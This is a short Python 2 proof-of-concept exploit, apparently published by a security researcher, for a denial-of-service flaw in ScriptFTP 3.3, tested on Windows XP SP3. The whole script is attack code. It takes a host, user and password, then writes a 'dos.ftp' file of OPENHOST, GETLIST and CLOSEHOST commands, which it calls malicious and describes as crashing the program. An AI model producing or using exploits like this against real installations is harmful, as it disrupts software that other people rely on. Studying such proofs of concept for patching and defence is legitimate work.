#!/usr/bin/python

# ScriptFTP 3.3 Multiple Commands Denial of Service Vulnerability
# Tested on: Windows XP SP3 (VMware Player 3.1.3 build-324285)
##

import sys
import time

def banner():
	print "\n[+] ScriptFTP 3.3 Denial of Service POC"
	print "[+] by modpr0be[at]digital-echidna[dot]org."
	print "[+] This will generate automated script to connect"
	print "[+] with ScriptFTP."
	print "============================================="

if len(sys.argv)!=4:
        banner()
        print "Usage: %s <ftp-server> <user> <pass>" %sys.argv[0]
	print "Example: %s ftp.google.com google pass123\n" %sys.argv[0]
        sys.exit(0)

host = sys.argv[1]
login = sys.argv[2]
passwd = sys.argv[3]
file = "dos.ftp"
getlist = "GETLIST($list,REMOTE_FILES)\r\n"
ophost = "OPENHOST("+host+","+login+","+passwd+")\r\n"
clhost = "CLOSEHOST\r\n"

banner()
try:
	print "[+] Preparing script file.."
	f = open(file,'w')
	f.write(ophost+getlist+clhost)
	time.sleep(2)
	f.close()
	print "[+] Malicious",file+" created succesfully."
except:
	print "[-] Cannot create file, sorry.."
